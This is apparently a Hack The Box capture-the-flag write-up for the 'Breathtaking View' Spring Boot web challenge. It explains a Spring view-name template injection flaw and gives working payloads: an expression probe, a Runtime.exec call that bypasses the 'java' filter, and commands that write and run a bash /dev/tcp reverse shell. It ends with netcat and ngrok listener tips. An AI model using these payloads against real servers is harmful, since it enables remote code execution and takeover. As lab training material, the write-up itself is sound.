---
clayout: ctf
title: Breathtaking View
date: 2024-10-27
image: /icon/hack-the-box/web.svg
type: Hack The Box

ctf:
    - name: Breathtaking View
      link: https://app.hackthebox.com/challenges/767
      thumbnail: /ctf/hack-the-box/challenges/web/breathtaking-view/thumbnail.jpg
      pwned:
        - link: https://www.hackthebox.com/achievement/challenge/585215/767
          thumbnail: /ctf/hack-the-box/challenges/web/breathtaking-view/pwned.png
---

## Box description

Check out my new website showcasing a breathtaking view—let's hope no one can 'manipulate' it!

## Challenge Description

This challenge is a web application written in **Spring Boot**. It provides a simple interface with registration and
login functionality. Once logged in, we are presented with the following page:

![View 1](/ctf/hack-the-box/challenges/web/breathtaking-view/view1.png)

Clicking the "Change Language" button redirects to another page:

![View 2](/ctf/hack-the-box/challenges/web/breathtaking-view/view2.png)

Looking at the URL, we can see that the language is passed as a parameter:

```
http://localhost:1337/?lang=fr
```

## Code Review

### IndexController.java

```java
@Controller
public class IndexController {
    @GetMapping("/")
    public String index(@RequestParam(defaultValue = "en") String lang, HttpSession session, RedirectAttributes redirectAttributes) {
        if (session.getAttribute("user") == null) {
            return "redirect:/login";
        }

        if (lang.toLowerCase().contains("java")) {
            redirectAttributes.addFlashAttribute("errorMessage", "But.... For what?");
            return "redirect:/";
        }

        return lang + "/index";
    }
}
```

Upon reviewing the `IndexController.java` code:

- The `index` method handles the rendering of the main page and takes in a `lang` parameter, which defaults to `"en"`.
- If the `user` session attribute is missing, the method redirects to the login page.
- If the `lang` parameter contains the string `"java"`, the method sets an error message and redirects to the index page.
- Otherwise, it returns a path based on `lang` by appending `"/index"` to it.

The concatenation of `lang` with `"/index"` could allow us to inject code into the `lang` parameter, leading to a **Server-Side Template Injection (SSTI)**
vulnerability.

## Exploitation - Server-Side Template Injection (SSTI)

### Proof of Concept (PoC)

To confirm SSTI vulnerability, we inject a simple expression into the `lang` parameter:

```plaintext
__${7*7}__::.x
```

Using this payload (sourced
from [HackTricks](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#spring-view-manipulation-java)),
we receive the following response:

```plaintext
Error resolving template [49], template might not exist or might not be accessible by any of the configured Template Resolvers
```

The payload `7*7` evaluated to `49`, confirming that SSTI is possible. We can now proceed to exploit this vulnerability.

### Exploit Strategy

Our goal is to inject Java code into the `lang` parameter to execute system commands on the server. However, since any
input containing the string `"java"` triggers a redirection, we need a workaround.

#### Using the T() Class

In Java, the `java.lang` package is imported by default. By leveraging the `T` operator from **Spring Expression
Language (SpEL)**, we can call methods like `Runtime.getRuntime()` without specifying `java.lang`.

### Payload

We start with a payload to list files in the current directory:

```java
__${T(Runtime).getRuntime().exec("ls")}__::.x
```

#### Response

```
Error resolving template [java.lang.UNIXProcess@590062a7], template might not exist or might not be accessible by any of the configured Template Resolvers
```

The response shows `java.lang.UNIXProcess@590062a7`, indicating that the `exec()` command executed successfully.
However, we don’t see the output of the `ls` command directly because `exec()` returns a `Process` object, not a string.

To capture command output, we need to redirect it to a more accessible place, such as a reverse shell.

### Establishing a Reverse Shell

To create a reverse shell, we start by setting up a listener on our machine and then use the following payload to create
a shell script on the server:

```java
__${T(Runtime).getRuntime().exec(new String[]{"bash", "-c", "echo 'bash -i >& /dev/tcp/ip/port 0>&1' > shell.sh"})}__::.x
```

Looking at the docker container file, we can see the `shell.sh` file created

### Executing the Shell Script

To run the shell script and establish the reverse shell, we use the following payload:

```java
__${T(Runtime).getRuntime().exec(new String[]{"bash", "-c", "bash shell.sh"})}__::.x
```

Upon execution, we successfully gain a reverse shell and can interact with the server.

With the reverse shell active, we proceed to list files in the root directory:

```bash
root@9348cae2ee45 /# ls
app
bin
boot
dev
etc
flag_lyh3sdrgCjCI_.txt
home
...
```

Reading the flag file:

```bash
root@9348cae2ee45 /# cat flag_lyh3sdrgCjCI_.txt
HTB{f4k3_fl4g_f0r_t35t1ng}
```

We now have the fake flag!

::: danger **Note for HTB Server**
Direct netcat connections to HTB IPs may not work. Use **ngrok** or similar tunneling tools to create a TCP tunnel to
your machine and connect with netcat.

```bash
ngrok tcp 12345
nc -lnv 12345
```

:::

## References

- [HackTricks - SSTI](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#spring-view-manipulation-java)
